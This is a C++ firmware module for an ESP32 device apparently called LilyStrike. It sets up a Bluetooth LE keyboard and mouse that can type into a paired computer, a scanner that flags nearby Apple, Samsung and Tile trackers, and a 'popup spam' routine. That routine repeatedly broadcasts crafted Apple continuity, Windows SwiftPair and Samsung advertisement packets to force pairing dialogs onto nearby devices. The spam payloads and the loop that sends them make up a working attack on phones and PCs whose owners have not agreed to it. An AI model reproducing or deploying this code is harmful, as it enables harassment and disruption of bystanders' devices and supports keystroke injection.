// ============================================================================
// blehid.cpp - BLE radio subsystem (NimBLE): HID, scanner, popup spam
// ----------------------------------------------------------------------------
// DESIGN:
//  - NimBLE host is started lazily (blehid::begin) and de-initialized when the
//    last BLE feature finishes -> heap is only consumed while BLE is used.
//  - HID: NimBLEHIDDevice with a combined keyboard(1)/mouse(2)/consumer(3)
//    report map. Pairing = Just Works (bonding on, MITM off, secure connect).
//  - Scanner: NimBLE scan callbacks -> vector table; tracker classification
//    from manufacturer data (Apple FindMy 0x004C/0x12, Samsung 0x0075, Tile).
//  - Popup spam: raw advertisement payloads that trigger iOS/Android/Windows
//    pairing dialogs (SwiftPair / Apple continuity). AUTHORIZED USE ONLY.
// ============================================================================
#include "blehid.h"
#include "config.h"
#include "crypt.h"
#include "util.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <NimBLEHIDDevice.h>
#include <vector>
#include <algorithm>

namespace blehid {

static bool s_host = false;          // NimBLE host initialized
static bool s_conn = false;          // HID connected
static NimBLEHIDDevice* s_hid = nullptr;
static NimBLECharacteristic* s_kbRep = nullptr;
static NimBLECharacteristic* s_msRep = nullptr;
static NimBLECharacteristic* s_ccRep = nullptr;
static SemaphoreHandle_t s_mtx = nullptr;
static void lock() { if (!s_mtx) s_mtx = xSemaphoreCreateMutex(); xSemaphoreTake(s_mtx, portMAX_DELAY); }
static void unlock() { if (s_mtx) xSemaphoreGive(s_mtx); }

// ---- HID report map: keyboard (ID1) + mouse (ID2) + consumer (ID3) ----
static const uint8_t REPORT_MAP[] = {
    // Keyboard (report id 1)
    0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x85, 0x01,
    0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01,
    0x75, 0x01, 0x95, 0x08, 0x81, 0x02,             // modifiers
    0x95, 0x08, 0x81, 0x01,                         // reserved byte
    0x05, 0x08, 0x95, 0x05, 0x75, 0x01, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02, // LEDs
    0x95, 0x03, 0x81, 0x01,                         // LED padding
    0x05, 0x07, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00,
    0x25, 0x65, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00, // 6 keycodes
    0xC0,
    // Mouse (report id 2)
    0x05, 0x01, 0x09, 0x02, 0xA1, 0x01, 0x85, 0x02,
    0x09, 0x01, 0xA1, 0x00,
    0x05, 0x09, 0x19, 0x01, 0x29, 0x03, 0x15, 0x00, 0x25, 0x01,
    0x75, 0x01, 0x95, 0x03, 0x81, 0x02,             // buttons
    0x95, 0x01, 0x75, 0x05, 0x81, 0x01,             // button padding
    0x05, 0x01, 0x09, 0x30, 0x09, 0x31, 0x15, 0x81, 0x25, 0x7F,
    0x75, 0x08, 0x95, 0x02, 0x81, 0x06,             // X,Y relative
    0x09, 0x38, 0x15, 0x81, 0x25, 0x7F, 0x75, 0x08, 0x95, 0x01, 0x81, 0x06, // wheel
    0xC0, 0xC0,
    // Consumer control (report id 3) - 2 byte usage value
    0x05, 0x0C, 0x09, 0x01, 0xA1, 0x01, 0x85, 0x03,
    0x15, 0x00, 0x26, 0xFF, 0x03, 0x75, 0x10, 0x95, 0x01,
    0x19, 0x00, 0x2A, 0xFF, 0x03, 0x81, 0x00,
    0xC0,
};

// ---------------------------------------------------------------- lifecycle
class SrvCb : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer*, NimBLEConnInfo&) override { s_conn = true; }
    void onDisconnect(NimBLEServer*, NimBLEConnInfo&, int) override {
        s_conn = false;
        NimBLEDevice::startAdvertising();   // keep discoverable for reconnect
    }
};

bool begin(bool wifiOff, int stage) {
    if (s_host) return true;
    // COEXIST TEST/DESIGN: if this build lacks WiFi+BT coexistence, starting
    // the BT controller while WiFi is up crashes (field: dies inside
    // NimBLEDevice::init). With wifiOff we take the radio exclusively -
    // same single-radio model as the offline WiFi attacks.
    if (wifiOff && WiFi.getMode() != WIFI_MODE_NULL) {
        // PROPER teardown: an in-progress esp_wifi_connect racing WIFI_OFF
        // is unsafe; also kill auto-reconnect so events can't re-arm STA.
        WiFi.setAutoReconnect(false);
        WiFi.disconnect(false);
        delay(60);
        WiFi.mode(WIFI_OFF);
        delay(100);
        logLine("ble: wifi off (exclusive radio)");
    }
    if (!s_mtx) s_mtx = xSemaphoreCreateMutex();
    // MEMORY GATE: the BT controller needs a ~70KB CONTIGUOUS RAM block.
    // On a fragmented heap the lib's ESP_ERROR_CHECK aborts instantly.
    size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    logLine("ble: [1] nimble init (free=" + String(ESP.getFreeHeap()) +
            " largest=" + String(largest) + ")");
    if (largest < 68000) {
        logLine("ble: memory too fragmented for BT - reboot the device and retry");
        return false;
    }
    // STAGED SELF-TEST (stage 1-5): lets us bisect the init path from the
    // API without serial: 1=init 2=+server 3=+HID 4=+reports 5=+advertise
    if (stage < 1 || stage > 5) stage = 5;
    if (!NimBLEDevice::init("LilyStrike")) { logLine("ble: [1] init FAILED"); return false; }
    if (stage < 2) { logLine("ble: stage 1 (init) OK"); return true; }
    logLine("ble: [2] security");
    NimBLEDevice::setSecurityAuth(true, false, true);   // bonding, no MITM (Just Works), secure conn
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
    logLine("ble: [3] server");
    NimBLEServer* srv = NimBLEDevice::createServer();
    srv->setCallbacks(new SrvCb());
    if (stage < 3) { logLine("ble: stage 2 (+server) OK"); return true; }
    logLine("ble: [4] hid device");
    s_hid = new NimBLEHIDDevice(srv);
    logLine("ble: [5] report map");
    s_hid->setManufacturer("LilyStrike");
    s_hid->setPnp(0x02, 0x305A, 0xFFFF, 0x0100);
    s_hid->setReportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
    logLine("ble: [6] characteristics");
    s_kbRep = s_hid->getInputReport(1);
    s_msRep = s_hid->getInputReport(2);
    s_ccRep = s_hid->getInputReport(3);
    if (stage < 5) { logLine("ble: stage 4 (+reports) OK"); return true; }
    logLine("ble: [7] advertising");
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    adv->setAppearance(0x03C1);            // HID keyboard
    adv->addServiceUUID(NimBLEUUID((uint16_t)0x1812));
    adv->start();
    s_host = true;
    s_conn = false;
    logLine("ble: [8] host up, advertising as keyboard");
    return true;
}

void deinit() {
    if (!s_host) return;
    NimBLEDevice::deinit();
    s_host = false; s_conn = false;
    s_hid = nullptr; s_kbRep = s_msRep = s_ccRep = nullptr;
    logLine("ble: host down");
}

bool ready() { return s_host; }
bool connected() { return s_host && s_conn; }

// ---------------------------------------------------------------- HID
// keyboard report: [mods, 0, k, 0,0,0,0,0]
static void sendKb(uint8_t mods, uint8_t k) {
    if (!s_host || !s_conn || !s_kbRep) return;
    uint8_t r[8] = { mods, 0, k, 0, 0, 0, 0, 0 };
    s_kbRep->setValue(r, 8);
    s_kbRep->notify();
}
void kbPress(uint8_t k) {
    static uint8_t mods = 0;
    if (k >= 0x80) {                      // modifier byte (same encoding as USB layer)
        mods |= (1 << (k - 0x80));
        sendKb(mods, 0);
        return;
    }
    sendKb(mods, k);
}
void kbRelease(uint8_t k) {
    static uint8_t mods = 0;
    if (k >= 0x80) {
        mods &= ~(1 << (k - 0x80));
        sendKb(mods, 0);
        return;
    }
    sendKb(mods, 0);
}
void kbReleaseAll() { if (s_kbRep) { uint8_t r[8] = {0}; s_kbRep->setValue(r, 8); s_kbRep->notify(); } }

// ASCII typing using the SAME layout tables as the USB keyboard (the layout
// encodes SHIFT flag 0x80 / ALT_GR flag 0x40 exactly like USBHIDKeyboard::press
// - so BLE typing matches USB typing byte for byte).
void kbWriteChar(char c, const uint8_t* layout) {
    if (!s_host || !s_conn || !layout) return;
    uint8_t k = layout[(uint8_t)c];
    if (!k) return;
    uint8_t mods = 0;
    if ((k & 0x80) == 0x80) { mods |= 0x02; k &= ~0x80; }   // left shift
    if ((k & 0x40) == 0x40) { mods |= 0x40; k &= ~0x40; }   // altgr
    sendKb(mods, k);
    delay(2);
    sendKb(0, 0);
}

void mouseButtons(uint8_t b) {
    if (!s_host || !s_conn || !s_msRep) return;
    uint8_t r[4] = { b, 0, 0, 0 };
    s_msRep->setValue(r, 4);
    s_msRep->notify();
}
void mouseMove(int8_t x, int8_t y, int8_t wheel) {
    if (!s_host || !s_conn || !s_msRep) return;
    uint8_t r[4] = { 0, (uint8_t)x, (uint8_t)y, (uint8_t)wheel };
    s_msRep->setValue(r, 4);
    s_msRep->notify();
}
void media(uint16_t usage) {
    if (!s_host || !s_conn || !s_ccRep) return;
    uint8_t r[2] = { (uint8_t)(usage & 0xFF), (uint8_t)(usage >> 8) };
    s_ccRep->setValue(r, 2);
    s_ccRep->notify();
    delay(3);
    uint8_t z[2] = {0, 0};
    s_ccRep->setValue(z, 2);
    s_ccRep->notify();
}

// ---------------------------------------------------------------- scanner
struct ScanState {
    bool busy = false;
    uint32_t t0 = 0, secs = 0;
    std::vector<BleDev> devs;
};
static ScanState s_scan;

class ScanCb : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (s_scan.devs.size() >= 60) return;
        BleDev d;
        d.mac = std::string(dev->getAddress()).c_str();
        d.rssi = dev->getRSSI();
        String n(dev->getName().c_str());
        d.name = n.length() ? n : String("(no name)");
        // tracker classification from manufacturer data
        d.kind = "";
        if (dev->haveManufacturerData()) {
            std::string md = dev->getManufacturerData();
            if (md.size() >= 3) {
                if ((uint8_t)md[0] == 0x4C && (uint8_t)md[1] == 0x00) {
                    d.kind = "Apple";
                    if ((uint8_t)md[2] == 0x12 && md.size() >= 27) d.kind = "Apple FindMy tracker?";
                } else if ((uint8_t)md[0] == 0x75 && (uint8_t)md[1] == 0x00) {
                    d.kind = "Samsung SmartTag?";
                } else if ((uint8_t)md[0] == 0x80 && (uint8_t)md[1] == 0x00) {
                    d.kind = "Tile?";
                }
            }
        }
        lock();
        s_scan.devs.push_back(d);
        unlock();
    }
};

// scan runs in a task (blocking scan can't live in the async_http task)
static void scanTask(void* pv) {
    uint32_t arg = (uint32_t)(uintptr_t)pv;
    uint32_t secs = arg & 0xFFFF;
    bool wifiOff = (arg >> 16) & 1;
    int stage = (int)((arg >> 17) & 0xFF);
    if (!begin(wifiOff, stage)) { s_scan.busy = false; vTaskDelete(nullptr); return; }
    if (stage < 5) {   // staged self-test: no scan, just teardown
        logLine("ble: stage test complete (stage " + String(stage) + ")");
        deinit();
        if (wifiOff) { WiFi.setAutoReconnect(true); WiFi.mode(WIFI_AP); WiFi.softAP(cfg.wifiSSID, cfg.wifiPass); }
        s_scan.busy = false;
        vTaskDelete(nullptr);
        return;
    }
    NimBLEScan* scan = NimBLEDevice::getScan();
    scan->setScanCallbacks(new ScanCb(), false);
    scan->setActiveScan(true);
    scan->setMaxResults(0);              // stream via callbacks, don't cache
    lock(); s_scan.devs.clear(); s_scan.t0 = millis(); s_scan.secs = secs; unlock();
    scan->start(secs, false);            // blocking within OUR task
    lock(); s_scan.busy = false; unlock();
    logLine("ble: scan done (" + String(s_scan.devs.size()) + " devices)");
    deinit();
    if (wifiOff) { WiFi.setAutoReconnect(true); WiFi.mode(WIFI_AP); WiFi.softAP(cfg.wifiSSID, cfg.wifiPass); }
    vTaskDelete(nullptr);
}

bool scanStart(uint32_t seconds, bool wifiOff, int stage) {
    if (s_scan.busy) return false;
    s_scan.busy = true;
    lock(); s_scan.devs.clear(); unlock();
    uint32_t arg = (seconds & 0xFFFF) | (wifiOff ? (1UL << 16) : 0) | (((uint32_t)stage & 0xFF) << 17);
    if (xTaskCreatePinnedToCore(scanTask, "blescan", 16384, (void*)(uintptr_t)arg, 1, nullptr, 0) != pdPASS) {
        s_scan.busy = false;
        return false;
    }
    return true;
}
bool scanBusy() { lock(); bool b = s_scan.busy; unlock(); return b; }
uint32_t scanProgress() {
    lock();
    uint32_t p = s_scan.busy ? (uint32_t)((millis() - s_scan.t0) * 100 / (s_scan.secs * 1000 + 1)) : 100;
    unlock();
    return p;
}
std::vector<BleDev> scanResults() {
    lock(); std::vector<BleDev> v = s_scan.devs; unlock();
    std::sort(v.begin(), v.end(), [](const BleDev& a, const BleDev& b) { return a.rssi > b.rssi; });
    return v;
}

// ---------------------------------------------------------------- popup spam
// raw advertisement payloads (canonical ESP32 BLE-spam structures)
static void applePacket(NimBLEAdvertisementData& d, uint8_t type) {
    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
    std::vector<uint8_t> m(27, 0x00);
    m[0] = 0x1B; m[1] = 0xFF; m[2] = 0x4C; m[3] = 0x00;
    m[4] = 0x0F; m[5] = 0x05; m[6] = 0xC1; m[7] = type;
    d.addData(m);
}
static void windowsPacket(NimBLEAdvertisementData& d) {
    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
    d.addData(std::vector<uint8_t>{0x03, 0x03, 0x06, 0x00});
    std::vector<uint8_t> m = {0x0B, 0xFF, 0x06, 0x00, 0x01, 0x09, 0x20, 0x02,
                              (uint8_t)'S',(uint8_t)'P',(uint8_t)'A',(uint8_t)'M',(uint8_t)'0',(uint8_t)'1'};
    d.addData(m);
}
static void samsungPacket(NimBLEAdvertisementData& d) {
    d.addData(std::vector<uint8_t>{0x02, 0x01, 0x1A});
    std::vector<uint8_t> m = {0x10, 0xFF, 0x75, 0x00, (uint8_t)'B', (uint8_t)'l', (uint8_t)'u', (uint8_t)'e',
                              (uint8_t)' ', (uint8_t)'N', (uint8_t)'e', (uint8_t)'t', (uint8_t)'w', (uint8_t)'o', (uint8_t)'r', (uint8_t)'k'};
    d.addData(m);
}

static bool s_spam = false;
static uint8_t s_spamMode = 0;

static void spamTask(void* pv) {
    uint32_t secs = (uint32_t)(uintptr_t)pv;
    if (!begin()) { s_spam = false; vTaskDelete(nullptr); return; }
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    uint32_t t0 = millis();
    while (s_spam && millis() - t0 < secs * 1000UL) {
        NimBLEAdvertisementData d;
        uint8_t pick = s_spamMode;
        if (pick == 0) pick = 1 + (esp_random() % 3);
        switch (pick) {
            case 1: applePacket(d, 0x27); break;   // "new device" popup
            case 2: windowsPacket(d); break;        // SwiftPair
            case 3: samsungPacket(d); break;
        }
        adv->setAdvertisementData(d);
        adv->start(0);
        delay(60);
        adv->stop();
        delay(20);
    }
    adv->stop();
    s_spam = false;
    deinit();
    logLine("ble-spam: done");
    vTaskDelete(nullptr);
}

bool spamStart(uint32_t seconds, uint8_t mode) {
    if (s_spam) return false;
    s_spam = true; s_spamMode = mode;
    logLine("ble-spam: mode " + String(mode) + " for " + String(seconds) + "s");
    if (xTaskCreatePinnedToCore(spamTask, "blespam", 8192, (void*)(uintptr_t)seconds, 1, nullptr, 0) != pdPASS) {
        s_spam = false;
        return false;
    }
    return true;
}
void spamStop() { s_spam = false; }
bool spamBusy() { return s_spam; }

} // namespace blehid
